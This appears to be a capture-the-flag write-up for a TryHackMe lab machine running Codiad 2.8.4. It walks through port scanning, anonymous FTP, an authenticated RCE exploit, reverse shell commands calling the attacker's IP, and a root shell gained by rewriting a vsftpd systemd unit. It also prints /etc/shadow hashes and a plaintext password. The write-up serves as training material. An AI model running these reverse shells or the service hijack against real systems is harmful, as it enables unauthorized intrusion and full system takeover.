# Recon

### Rustscan


```
docker run rustscan/rustscan -a 10.10.239.154 | tee /opt/THM/ide/1-recon/rustscan_init.md
```

```
PORT      STATE SERVICE REASON
21/tcp    open  ftp     syn-ack
22/tcp    open  ssh     syn-ack
80/tcp    open  http    syn-ack
62337/tcp open  unknown syn-ack
```


### Nmap

```bash
nmap -vvv -Pn -sC -sV -oN /opt/THM/ide/1-recon/nmap/nmap_init.md 10.10.239.154
```

```
PORT      STATE    SERVICE       REASON      VERSION
21/tcp    open     ftp           syn-ack     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.24.127
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open     ssh           syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC94RvPaQ09Xx+jMj32opOMbghuvx4OeBVLc+/4Hascmrtsa+SMtQGSY7b+eyW8Zymxi94rGBIN2ydPxy3XXGtkaCdQluOEw5CqSdb/qyeH+L/1PwIhLrr+jzUoUzmQil+oUOpVMOkcW7a00BMSxMCij0HdhlVDNkWvPdGxKBviBDEKZAH0hJEfexz3Tm65cmBpMe7WCPiJGTvoU9weXUnO3+41Ig8qF7kNNfbHjTgS0+XTnDXk03nZwIIwdvP8dZ8lZHdooM8J9u0Zecu4OvPiC4XBzPYNs+6ntLziKlRMgQls0e3yMOaAuKfGYHJKwu4AcluJ/+g90Hr0UqmYLHEV
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBzKTu7YDGKubQ4ADeCztKu0LL5RtBXnjgjE07e3Go/GbZB2vAP2J9OEQH/PwlssyImSnS3myib+gPdQx54lqZU=
|   256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ+oGPm8ZVYNUtX4r3Fpmcj9T9F2SjcRg4ansmeGR3cP
80/tcp    open     http          syn-ack     Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
514/tcp   filtered shell         no-response
1063/tcp  filtered kyoceranetdev no-response
1077/tcp  filtered imgames       no-response
1494/tcp  filtered citrix-ica    no-response
1583/tcp  filtered simbaexpress  no-response
3324/tcp  filtered active-net    no-response
3325/tcp  filtered active-net    no-response
4848/tcp  filtered appserv-http  no-response
33354/tcp filtered unknown       no-response
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

almost missed that port

```
nmap -vvv -Pn -sC -sV -p 62337 -oN /opt/THM/ide/1-recon/nmap/nmap_62337.md 10.10.239.154
```

would ya loook at that

```
PORT      STATE SERVICE REASON  VERSION
62337/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: B4A327D2242C42CF2EE89C623279665F
|_http-title: Codiad 2.8.4
|_http-server-header: Apache/2.4.29 (Ubuntu)
```


# Enumeration

### FTP

ftp anon allowed

```
ftp 10.10.239.154 
```

```                 
Connected to 10.10.239.154.
220 (vsFTPd 3.0.3)
Name (10.10.239.154:devel): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

strange directory labeled "*...*"
```
ftp> ls -la
229 Entering Extended Passive Mode (|||7095|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
```

strange file named "*-*"

```
ftp> ls
229 Entering Extended Passive Mode (|||53721|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
226 Directory send OK.
ftp> cd -
550 Failed to change directory.
ftp> get -
local: - remote: -
229 Entering Extended Passive Mode (|||46769|)
150 Opening BINARY mode data connection for - (151 bytes).
100% |**********************************|   151      140.70 KiB/s    00:00 ETA
226 Transfer complete.
151 bytes received in 00:00 (1.22 KiB/s)

```

renamed the file to "strange" so its not messing with any terminal tools

```
└─$ file strange                       
strange: ASCII text
```

contents of the file

```
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```

possible users

```
john
drac
```

### WEB

http://10.10.239.154/

apache 2 default page


http://10.10.239.154:62337

some sort of login form


![[web62337.png]]

```
gobuster dir -u http://10.10.239.154:62337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o /opt/THM/ide/2-enum/web/gob_dir_2.3_med_62337.md
```


```
/themes               (Status: 301) [Size: 324] [--> http://10.10.239.154:62337/themes/]
```


http://10.10.239.154:62337/themes/

![[themes.png]]

also a version disclosure

view-source:http://10.10.239.154:62337/


```
<title>Codiad 2.8.4</title>
```


# Exploitation

```
searchsploit codiad 2.8.4 
```


```      
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Codiad 2.8.4 - Remote Code Execution (Authenticated)                                                                       | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                                                                   | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                                                                   | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                                                                   | multiple/webapps/50474.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

need to be authenticated, after reviewing the message from the ftp server, we need to find the default password for the web service codiad

found this default password

https://attackdefense.com/challengedetailsnoauth?cid=312

trying the credentials to login

```
john
password
```

success

![[codiad.png]]

https://www.exploit-db.com/exploits/49705

```
python 49705.py http://10.10.239.154:62337/ john password 10.6.24.127 1337 linux
```

after some trial and error, I noticed you need to have two listeners going at once

so run the python script with the arguments as seen 


```
python 49705.py http://10.10.239.154:62337/ john password 10.6.24.127 1337 linux
```

then the exploit script dictates to run the following command

```
echo 'bash -c "bash -i >/dev/tcp/10.6.24.127/1338 0>&1 2>&1"' | nc -lnvp 1337
```

it also specifies to run an additional command in another terminal

```
nc -lnvp 1338
```

this is what it looks like when ran successfully

![[webrevshells1.png]]

![[webrevshells2.png]]

![[webrevshells3.png]]


we get a successful reverse shell

```
www-data@ide:/var/www/html/codiad/components/filemanager$ whoami
whoami
www-data
www-data@ide:/var/www/html/codiad/components/filemanager$ uname -a
uname -a
Linux ide 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
www-data@ide:/var/www/html/codiad/components/filemanager$
```

# Privilege Escalation

### drac


upgrade to a tty

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

there is a drac user in /home

```
www-data@ide:/home$ ls -la /home/
ls -la /home/
total 12
drwxr-xr-x  3 root root 4096 Jun 17  2021 .
drwxr-xr-x 24 root root 4096 Jul  9  2021 ..
drwxr-xr-x  6 drac drac 4096 Aug  4  2021 drac
```

we see a mysql login in drac's bash history

```
cat /home/drac/.bash_history
```

```
cat .bash_history
mysql -u drac -p 'Th3dRaCULa1sR3aL'
```

running it does not work

```
www-data@ide:/home/drac$ mysql -u drac -p 'Th3dRaCULa1sR3aL'
mysql -u drac -p 'Th3dRaCULa1sR3aL'

Command 'mysql' not found, but can be installed with:

apt install mysql-client-core-5.7   
apt install mariadb-client-core-10.1

Ask your administrator to install one of them.

www-data@ide:/home/drac$
```

trying the mysql password to change user to the draq user works

```
www-data@ide:/home/drac$ su drac
su drac
Password: Th3dRaCULa1sR3aL

drac@ide:~$
```

/home/drac/user.txt

```
02930d21a8eb009f6d26361b2d24a466
```

### Root

/etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
drac:x:1000:1000:drac:/home/drac:/bin/bash
ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

```
drac@ide:/var/www/html/codiad$ sudo -l
[sudo] password for drac: 
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

```
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#services
/etc/systemd/system/multi-user.target.wants/vsftpd.service

```

the file is owned by root but we can read and write

```
lrwxrwxrwx 1 root root 34 Jun 18  2021 /etc/systemd/system/multi-user.target.wants/vsftpd.service -> /lib/systemd/system/vsftpd.service
```

turnign the service malicious with a reverse shell

original service


```
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
```

new service

```
nano 
```

```
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'sh -i >& /dev/tcp/10.6.24.127/1341 0>&1'
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty

[Install]
WantedBy=multi-user.target
```

start a listener on attacker machine

```
nc -lvnp 1341
```

run the service with permissions

```
systemctl daemon-reload
Th3dRaCULa1sR3aL
sudo /usr/sbin/service vsftpd restart
```


the output

```
drac@ide:/var/www/html/codiad$ nano /etc/systemd/system/multi-user.target.wants/vsftpd.service
drac@ide:/var/www/html/codiad$ systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password: 
==== AUTHENTICATION COMPLETE ===
drac@ide:/var/www/html/codiad$ sudo /usr/sbin/service vsftpd restart
```

we get our shell

```
listening on [any] 1341 ...
connect to [10.6.24.127] from (UNKNOWN) [10.10.239.154] 41766
sh: 0: can't access tty; job control turned off
# whoami
root
# uname -a
Linux ide 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
# sudo -l
Matching Defaults entries for root on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on ide:
    (ALL : ALL) ALL
# 
```

/root/root.txt

```
ce258cb16f47f1c66f0b0b77f4e0fb8d
```

/etc/shadow

```
root:$6$QYHRcZg0$Zrs3m3TUQLln2eDdTNmh8pMY747fLC6hsnQytI/zmMM4bEbD5xl5/W0QRZQ091LhUVSM.6lmbmg0BulIzFpXT.:18796:0:99999:7:::
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::
gnats:*:18480:0:99999:7:::
nobody:*:18480:0:99999:7:::
systemd-network:*:18480:0:99999:7:::
systemd-resolve:*:18480:0:99999:7:::
syslog:*:18480:0:99999:7:::
messagebus:*:18480:0:99999:7:::
_apt:*:18480:0:99999:7:::
lxd:*:18480:0:99999:7:::
uuidd:*:18480:0:99999:7:::
dnsmasq:*:18480:0:99999:7:::
landscape:*:18480:0:99999:7:::
pollinate:*:18480:0:99999:7:::
sshd:*:18795:0:99999:7:::
drac:$6$1COGP750$zJinq4p1DzAfYuXHyUYA61g9b1pU/ThmHMuwvxXTwnmj41Y63FIG7pB7qCDcgjVE69RmzByG319npQS7/Rq.x1:18796:0:99999:7:::
ftp:*:18796:0:99999:7:::
```
